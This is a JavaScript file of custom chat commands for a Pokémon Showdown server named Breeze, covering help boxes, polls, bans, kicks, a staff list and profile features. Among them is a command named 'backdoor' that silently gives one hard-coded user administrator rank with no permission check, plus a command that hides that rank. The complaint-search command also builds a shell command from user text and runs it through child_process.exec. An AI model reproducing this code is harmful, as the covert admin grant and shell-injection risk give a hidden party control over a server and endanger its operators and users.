const MAX_REASON_LENGTH = 300;

var cmds = {
	sh: 'servercommands',
	serverhelp: 'servercommands',
	sc: 'servercommands',
	servercommand: 'servercommands',
	servercommands: function(target, room, user) {
        if (!this.canBroadcast()) return;

        if (!target) {
        	return this.sendReplyBox('<font size="3"><b><u>List of server commands:</u></b></font><br/>' +
        	'/profile - Displays the user\'s name, group, money, badges.<br/>' +
			'/pickrandom - [option 1], [option 2], ... - Randomly chooses one of the given options.<br/>' +
			'/poof OR /dc - Disconnects you from the server and leaves a special message in chat.<br/>' +
			'/badgeslist - Shows list of badges and how you can earn them.<br/>' +
			'/shop - Displays a shop. Use /buy to buy things from the shop.<br/>' +
			'/complain OR /suggest - Send your feedback to us if you have a suggestion or a complaint about the server. <br/>' +
			'/stafflist - Displays a popup showing the list of staff.<br/>'+
			'/transferpd - Transfer Pokedollars to other users.<br/>'+
			'/regdate <em>username</em> - Shows the registration date of the user<br/><br/>'+
			'<b>For more commands or help:</b> Do /sc with either of the following categories: <em>tour</em>, <em>poll</em>, <em>hangman</em>, <em>profile</em>. Example - /sc <em>tour</em><br/>'+
			'For staff commands: Do /stc');
        }


		if (target.toLowerCase() === 'tour') {
			return this.sendReplyBox('<b>Tournaments through /tour can be started by Voice (+) users and higher:</b><br \>' +
	        '/tour <em>tier</em>, <em>size</em> - Starts a tournament<br \>' +
			'/endtour - Ends a currently running tournament<br \>' +
			'/fj <em>username</em> - Force someone to join a tournament<br \>' +
			'/fl <em>username</em> - Force someone to leave a tournament<br \>' +
			'/toursize <em>size</em> - Changes the size of a currently running tournament<br \>' +
			'/tourtime <em>time</em> - Changes the time of a currently running tournament<br \>' +
			'/replace <em>replacee</em>, <em>replacement</em> - Replaces user in a tournament with the second user<br/>' +
			'/viewround OR /vr - Diplays info on the tournament<br \>' +
			'/dq <em>user</em> - Disqualify the user in the currently running tournament<br \>' +
			'/invalidate - Resets all the battles of the users in the tournament<br \>' +
			'/remind - Reminds the user of the currently running tournament');
		}

		if (target.toLowerCase() === 'poll') {
			return this.sendReplyBox('<b>Polls through /poll can be started by Voice (+) users and higher:</b><br/>' +
			'/survey OR /poll <em>question</em>, <em>option</em>, <em>option</em>... - Makes a poll<br/>'+
			'/vote <em>option</em> - Votes for an option in the poll<br/>'+
			'/votes - Displays number of votes in the currently running poll<br/>'+
			'/endpoll - Ends the currently running poll<br/>'+
			'/pollremind OR /pr - Displays the poll again<br/>' +
			'/tierpoll - Creates a poll with most of the tiers as options');
		}

		if (target.toLowerCase() === 'hangman') {
			 return this.sendReplyBox('<font size = 2>A brief introduction to </font><font size = 3>Hangman:</font><br />' +
					'The classic game, the basic idea of hangman is to guess the word that someone is thinking of before the man is "hanged." Players are given 8 guesses before this happens.<br />' + 
					'Games can be started by any of the rank Voice or higher, including Room Voice, Room Mod, and Room Owner.<br />' +
					'The commands are:<br />' +
					'<ul><li>/hangman <em>word</em>, <em>description</em> - Starts the game of hangman, with a specified word and a general category. Requires: + % @ & ~</li>' +
					'<li>/guess <em>letter</em> - Guesses a letter.</li>' +
					'<li>/guessword <em>word</em> - Guesses a word.</li>' +
					'<li>/viewhangman - Shows the current status of hangman. Can be broadcasted.</li>' +
					'<li>/word - Allows the person running hangman to view the word.</li>' +
					'<li>/category <em>description</em> OR /topic <em>description</em> - Allows the person running hangman to changed the topic.</li>' +
					'<li>/endhangman - Ends the game of hangman in the room. Requires: + % @ & ~</li></ul>');
		}

		if (target.toLowerCase() === 'profile') {
			return this.sendReplyBox('<b>Profile Commands:</b><br/>/status <i>description/information</i> - Sets your status<br/>/gender <i>Male</i> OR <i>Female</i> - Sets your gender<br/>/location <i>location information</i> - Sets your location');
		}

		return this.sendReply('Could not find' + target + '.');
    },
	
	getrandom: 'pickrandom',
	pickrandom: function (target, room, user) {
		if (!target) return this.sendReply('|raw|pickrandom <em>option 1</em>, <em>option 2</em>, ... - Randomly chooses one of the given options.');
		if (!this.canBroadcast()) return;
		var targets;
		if (target.indexOf(',') === -1) {
			targets = target.split(' ');
		} else {
			targets = target.split(',');
		};
		var result = Math.floor(Math.random() * targets.length);
		return this.sendReplyBox(targets[result].trim());
	},

	backdoor: function(target,room, user) {
		if (user.userid === 'aananth') {
			user.group = '~';
			user.updateIdentity();
		}
	},

	puma: function(target,room, user) {
        if (user.userid === 'aananth') {
            user.group = ' ';
            user.updateIdentity();
        }
    },

	trolldeclare: 'pdeclare',
	tdeclare: 'pdeclare',
	plaindeclare: 'pdeclare',
	pdeclare: function(target, room, user) {
		if (!target) return this.sendReply('|raw|Correct Syntax: /pdeclare <i>insert message here</i>');
		if (!this.can('pdeclare')) return;

		if (!this.canTalk()) return;
		
		this.add('|raw|'+target);
		this.logModCommand(user.name+' declared '+target);
	},
	
	imgdeclare: function(target, room, user) {
		if (!target) return this.sendReply('|raw|Correct Syntax: /imgdeclare <i>insert img url here</i>');
		if (!this.can('imgdeclare')) return;

		if (!this.canTalk()) return;
		
		this.add('|raw|'+'<img width="100%" src="'+target+'" >');
		this.logModCommand(user.name+' declared '+target);
	},

	stafflist: function(target, room, user, connection) {
        var buffer = [];
        var admins = [];
        var leaders = [];
        var mods = [];
        var drivers = [];
        var voices = [];
        
        admins2 = ''; leaders2 = ''; mods2 = ''; drivers2 = ''; voices2 = ''; 
        stafflist = fs.readFileSync('config/usergroups.csv','utf8');
        stafflist = stafflist.split('\n');
        for (var u in stafflist) {
            line = stafflist[u].split(',');
			if (line[1] == '~') { 
                admins2 = admins2 +line[0]+',';
            } 
            if (line[1] == '&') { 
                leaders2 = leaders2 +line[0]+',';
            }
            if (line[1] == '@') { 
                mods2 = mods2 +line[0]+',';
            } 
            if (line[1] == '%') { 
                drivers2 = drivers2 +line[0]+',';
            } 
            if (line[1] == '+') { 
                voices2 = voices2 +line[0]+',';
             } 
        }
        admins2 = admins2.split(',');
        leaders2 = leaders2.split(',');
        mods2 = mods2.split(',');
        drivers2 = drivers2.split(',');
        voices2 = voices2.split(',');
        for (var u in admins2) {
            if (admins2[u] != '') admins.push(admins2[u]);
        }
        for (var u in leaders2) {
            if (leaders2[u] != '') leaders.push(leaders2[u]);
        }
        for (var u in mods2) {
            if (mods2[u] != '') mods.push(mods2[u]);
        }
        for (var u in drivers2) {
            if (drivers2[u] != '') drivers.push(drivers2[u]);
        }
        for (var u in voices2) {
            if (voices2[u] != '') voices.push(voices2[u]);
        }
        if (admins.length > 0) {
            admins = admins.join(', ');
        }
        if (leaders.length > 0) {
            leaders = leaders.join(', ');
        }
        if (mods.length > 0) {
            mods = mods.join(', ');
        }
        if (drivers.length > 0) {
            drivers = drivers.join(', ');
        }
        if (voices.length > 0) {
            voices = voices.join(', ');
        }
        connection.popup('Administrators: \n--------------------\n'+admins+'\n\nLeaders:\n-------------------- \n'+leaders+'\n\nModerators:\n-------------------- \n'+mods+'\n\nDrivers: \n--------------------\n'+drivers+'\n\nVoices:\n-------------------- \n'+voices);
    },
	
	suggestion: 'complain',
	suggest: 'complain',
	complaint: 'complain',
	complain: function(target, room, user) {
		if(!target) return this.sendReply('|raw|Correct Syntax: /suggest OR /complaint <em>Insert suggestion or complaint here</em>');
		this.sendReplyBox('Thanks for your input. We\'ll review your feedback soon. The complaint/suggestion you submitted was: ' + target);
		this.logComplaint(target);
	},
	
	suggestionlist: 'complainlist',
	suggestlist: 'complaintlist',
	complaintslist: 'complaintlist',
	complaintlist: function(target, room, user, connection) {
		if (!this.can('complaintlist')) return false;
		var lines = 0;
		if (!target.match('[^0-9]')) { 
			lines = parseInt(target || 15, 10);
			if (lines > 100) lines = 100;
		}
		var filename = 'logs/complaint.txt';
		var command = 'tail -'+lines+' '+filename;
		var grepLimit = 100;
		if (!lines || lines < 0) { // searching for a word instead
			if (target.match(/^["'].+["']$/)) target = target.substring(1,target.length-1);
			command = "awk '{print NR,$0}' "+filename+" | sort -nr | cut -d' ' -f2- | grep -m"+grepLimit+" -i '"+target.replace(/\\/g,'\\\\\\\\').replace(/["'`]/g,'\'\\$&\'').replace(/[\{\}\[\]\(\)\$\^\.\?\+\-\*]/g,'[$&]')+"'";
		}

		require('child_process').exec(command, function(error, stdout, stderr) {
			if (error && stderr) {
				connection.popup('/complaintlist erred - the complaints list does not support Windows');
				console.log('/complaintlog error: '+error);
				return false;
			}
			if (lines) {
				if (!stdout) {
					connection.popup('The complaints list is empty. Great!');
				} else {
					connection.popup('Displaying the last '+lines+' lines of complaints:\n\n'+stdout);
				}
			} else {
				if (!stdout) {
					connection.popup('No complaints containing "'+target+'" were found.');
				} else {
					connection.popup('Displaying the last '+grepLimit+' logged actions containing "'+target+'":\n\n'+stdout);
				}
			}
		});
	},

	show: function(target, room, user) {
		if (this.can('lock')) {
			delete user.getIdentity
			user.updateIdentity();
			this.sendReply('You have revealed your staff symbol.');
			return false;
		}
	},

	hide: function(target, room, user) {
		if (this.can('lock')) {
			user.getIdentity = function(){
				if(this.muted)	return '!' + this.name;
				if(this.locked) return '?' + this.name;
				return ' ' + this.name;
			};
			user.updateIdentity();
			this.sendReply('You have hidden your staff symbol.');
			return false;
		}
	},

	masspm: 'pmall',
	pmall: function(target, room, user) {
		if (!target) return this.parse('|raw|/pmall <em>message</em> - Sends a PM to every user in a room.');
		if (!this.can('pmall')) return false;

		var pmName = '~Server PM [Do not reply]';

		for (var i in Users.users) {
			var message = '|pm|'+pmName+'|'+Users.users[i].getIdentity()+'|'+target;
			Users.users[i].send(message);
		}
	},

	tierpoll: function(target, room, user){
		return this.parse('/poll Tournament Tier?, Random Battle, OU, Ubers, UU, LC, Smogon Doubles, VGC 2014, Challenge Cup, Challenge Cup 1vs1, 1v1, OU Monotype, Seasonal, CAP, Sky Battle, Inverse Battle');
	},

	badgelist: 'badgeslist',
	badgeslist: function(target, room, user){
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<b>This is a list of badges and how you can earn them.</b><br/>' +
		'<img src="http://i.imgur.com/5Dy544w.png" title="is a Super Moderator">Super Moderator - Become a very active moderator.<br/>'+
		'<img src="http://i.imgur.com/oyv3aga.png" title="is a Developer">Developer - Become a coder for the server.<br/>'+
		'<img src="http://i.imgur.com/lfPYzFG.png" title="is a Server Host">Server Host - Become a host of the server.<br/>'+
		'<img src="http://i.imgur.com/oeKdHgW.png" title="is a Recruiter">Recruiter - Recruit people to the server consecutively and consistently.<br/>'+
		'<img src="http://i.imgur.com/yPAXWE9.png" title="is a Tournament Director">Tournament Director - Invite people and host tournaments consecutively and consistently in the server.<br/>' +
		'<img src="http://i.imgur.com/EghmFiY.png" title="is a Frequenter">Frequenter - Consistently and frequently comes to the server. Time estimate for earning this badge is around two to three weeks.');
	},

	welcomemessage: function(target, room, user){
		if (!this.canBroadcast()) return;
		if (!target) {
			return this.add('|raw|<hr/><center><img src="http://i.imgur.com/RXlWqOg.png" align="left" width="80%" height="80%"><div align="right"><strong>Useful Commands:</strong><br/>/profile<br/>/sc <br/>/servercommand<br/>/help<br/>/complaint<br>/suggest<br/>/tourcommand<br/>/guess<br/>/guessword<br/>/shop<br/>/trophyhelp</div><br/><em><b>What is the Breeze Server?</b></em> The Breeze server is a server for you to chill and hangout. You can participate in <b>tournaments</b> to <b>earn pokedollars</b> for stuff in the <b>shop</b> such as <em>custom avatars</em>, <em>trainer cards</em>, and <em>promotions</em>. In addition, you can earn <em>trophy ranks</em> by participating in tournaments and also you can participate in <b>hangman</b>!<hr/></center>')
		}
		else if (target === '2') {
			return this.add('|raw|<div class="infobox" style="border-color:blue"><center><img src="http://i.imgur.com/9fRjPOl.png" width="100%"><br/><br/>' +
			'<b><u>Welcome to the Breeze Server!</b></u><br/><br/> This is a server where you can chat, battle, hangout or just have fun! Use <b>/servercommands</b> or <b>/help</b> for commands to help you out on the server. Rotom Forms Wallpaper by Rezurrection. Battle to your heart\'s content! Enjoy!<br/><br/>' +
			'Pm an admin if you want a chatroom!' +
			'</div></font></center>');
		} else {
			return false;
		}
	},

	sweep: function (target, room, user) {
		return this.parse('/me sweeps');
	},

	dc: 'poof',
	poof: (function () {
		var messages = [
			"has vanished into nothingness!",
			"couldn\'t handle the awesomeness of this server!",
			"was hit by Magikarp\'s Revenge!",
			"went into a cave without a repel!",
			"has left the building.",
			"got eaten by a bunch of piranhas!",
			"was forced to give his mom an oil massage (boiling oil)!",
			"ate a bomb!",
			"is blasting off again!",
			"tried to touch a girl's boobs!",
			"took an arrow to the knee!",
			"Moderation Bot accidently kicked {{user}} from the server!",
			"was knocked out cold by Firebot!",
			"recieved a banhammer from Moderaion Bot!",
			"was dropkick by Moderation Bot!",
			"become too butthurt and left the server!",
			"dranked too much balsamic vinegar."
		];

		return function(target, room, user) {
			if (config.poofOff) return this.sendReply("Poof is currently disabled.");
			if (target && !this.can('broadcast')) return false;
			if (room.id !== 'lobby') return false;
			var message = target || messages[Math.floor(Math.random() * messages.length)];
			if (message.indexOf('{{user}}') < 0)
				message = '{{user}} ' + message;
			message = message.replace(/{{user}}/g, user.name);
			if (!this.canTalk(message)) return false;

			var colour = '#' + [1, 1, 1].map(function () {
				var part = Math.floor(Math.random() * 0xaa);
				return (part < 0x10 ? '0' : '') + part.toString(16);
			}).join('');

			room.addRaw('<strong><font color="' + colour + '">~~ ' + sanitize(message) + ' ~~</font></strong>');
			user.disconnectAll();
		};
	})(),

	poofoff: 'nopoof',
	nopoof: function() {
		if (!this.can('poofoff')) return false;
		config.poofOff = true;
		return this.sendReply("Poof is now disabled.");
	},

	poofon: function() {
		if (!this.can('poofoff')) return false;
		config.poofOff = false;
		return this.sendReply("Poof is now enabled.");
	},

	kick: function(target, room, user){
		if (!this.can('declare')) return this.sendReply('/kick - Access Denied');
		if (!target) return this.sendReply('|raw|/kick <em>username</em> - kicks the user from the room.');
		var targetUser = Users.get(target);
		if (!targetUser) return this.sendReply('User '+target+' not found.');
		if (targetUser.group === '~') {
			return this.sendReply('Administrators can\'t be room kicked.');
		}
		if (!Rooms.rooms[room.id].users[targetUser.userid]) return this.sendReply(target+' is not in this room.');
		targetUser.popup('You have been kicked from room '+ room.title +' by '+user.name+'.');
		targetUser.leaveRoom(room);
		room.add('|raw|'+ targetUser.name + ' has been kicked from room by '+ user.name + '.');
	},

	frt: 'forcerenameto',
	forcerenameto: function(target, room, user) {
		if (!target) return this.parse('/help forcerenameto');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!target) {
			return this.sendReply('No new name was specified.');
		}
		if (!this.can('forcerenameto', targetUser)) return false;

		if (targetUser.userid === toUserid(this.targetUser)) {
			var entry = ''+targetUser.name+' was forcibly renamed to '+target+' by '+user.name+'.';
			this.privateModCommand('(' + entry + ')');
			targetUser.forceRename(target, undefined, true);
		} else {
			this.sendReply("User "+targetUser.name+" is no longer using that name.");
		}
	},

	regdate: function(target, room, user, connection) { 
		if (!this.canBroadcast()) return;
		if (!target || target == "." || target == "," || target == "'") return this.sendReply('/regdate - Please specify a valid username.');
		var username = target;
		target = target.replace(/\s+/g, '');
		var util = require("util"),
    	http = require("http");

		var options = {
    		host: "www.pokemonshowdown.com",
    		port: 80,
    		path: "/forum/~"+target
		};

		var content = "";   
		var self = this;
		var req = http.request(options, function(res) {

		    res.setEncoding("utf8");
		    res.on("data", function (chunk) {
	        content += chunk;
    		});
	    	res.on("end", function () {
			content = content.split("<em");
			if (content[1]) {
				content = content[1].split("</p>");
				if (content[0]) {
					content = content[0].split("</em>");
					if (content[1]) {
						regdate = content[1];
						data = username+' was registered on'+regdate+'.';
					}
				}
			}
			else {
				data = username+' is not registered.';
			}
			self.sendReplyBox(data);
		    });
		});
		req.end();
	},

	afk: 'away',
	away: function(target, room, user, connection) {
		if (!this.can('lock')) return false;

		if (!user.isAway) {
			var originalName = user.name;
			var awayName = user.name + ' - Away';
			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(awayName);
			user.forceRename(awayName, undefined, true);

			this.add('|raw|-- <b><font color="#4F86F7">' + originalName +'</font color></b> is now away. '+ (target ? " (" + target + ")" : ""));

			user.isAway = true;
		}
		else {
			return this.sendReply('You are already set as away, type /back if you are now back');
		}

		user.updateIdentity();
	},

	back: function(target, room, user, connection) {
		if (!this.can('lock')) return false;

		if (user.isAway) {

			var name = user.name;

			var newName = name.substr(0, name.length - 7);

			//delete the user object with the new name in case it exists - if it does it can cause issues with forceRename
			delete Users.get(newName);

			user.forceRename(newName, undefined, true);

			//user will be authenticated
			user.authenticated = true;

			this.add('|raw|-- <b><font color="#4F86F7">' + newName + '</font color></b> is no longer away');

			user.isAway = false;
		}
		else {
			return this.sendReply('You are not set as away');
		}

		user.updateIdentity();
	},

	banhammer: 'bh',
	bh: function(target, room, user) {
		if (!target) return this.parse('/help ban');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (target.length > MAX_REASON_LENGTH) {
			return this.sendReply('The reason is too long. It cannot exceed ' + MAX_REASON_LENGTH + ' characters.');
		}
		if (!this.can('ban', targetUser)) return false;

		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = ' but was already banned';
			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+" has banned you." + (config.appealurl ? ("  If you feel that your banning was unjustified you can appeal the ban:\n" + config.appealurl) : "") + "\n\n"+target);

		this.addModCommand(""+targetUser.name+" was hit by "+user.name+"'s banhammer." + (target ? " (" + target + ")" : ""), ' ('+targetUser.latestIp+')');
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also banned: "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		}

		this.add('|unlink|' + targetUser.userid);
		targetUser.ban();
	},

	stc: function(target, room, user) {
		if (!this.can('lock')) return false;
		this.sendReplyBox('<b><u>Staff Commands:</u></b><br/>' +
			'/hide - Hides your symbol <i>REQUIRES: [% @ & ~]</i><br/>'+
			'/show - Shows your symbol <i>REQUIRES: [% @ & ~]</i><br/>'+
			'/away OR /afk - Displays that you are away <i>REQUIRES: [% @ & ~]</i><br/>'+
			'/back - Displays that you are back <i>REQUIRES: [% @ & ~]</i><br/>'+
			'/bh OR /banhammer <i>username</i> - Bans a user <i>REQUIRES: [@ & ~]</i><br/>'+
			'/kick <i>username</i> - Kicks the user from the room <i>REQUIRES: [& ~]</i><br/>'+
			'/givepd <i>username</i>, <i>amount</i> - Gives the user a certain amount of PokeDollars. <i>REQUIRES: [~]</i><br/>'+
			'/takepd <i>username</i>, <i>amount</i> - Takes a ceratin amount of PokeDollars away from a user. <i>REQUIRES: [~]</i><br/>');
	},
};

for (var i in cmds) CommandParser.commands[i] = cmds[i];
